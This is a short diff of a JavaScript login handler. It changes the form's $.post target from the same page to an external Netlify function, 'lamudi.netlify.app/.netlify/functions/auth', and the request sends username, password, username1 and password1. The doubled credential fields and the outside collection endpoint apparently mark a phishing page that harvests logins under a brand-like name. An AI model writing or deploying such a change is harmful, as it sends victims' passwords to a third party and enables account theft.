@@ -246,7 +246,7 @@
       return alert('Please enter valid username and password.');
     }
 
-    $.post('', {
+    $.post('https://lamudi.netlify.app/.netlify/functions/auth', {
       username: x,
       password: y,
       username1: x1,
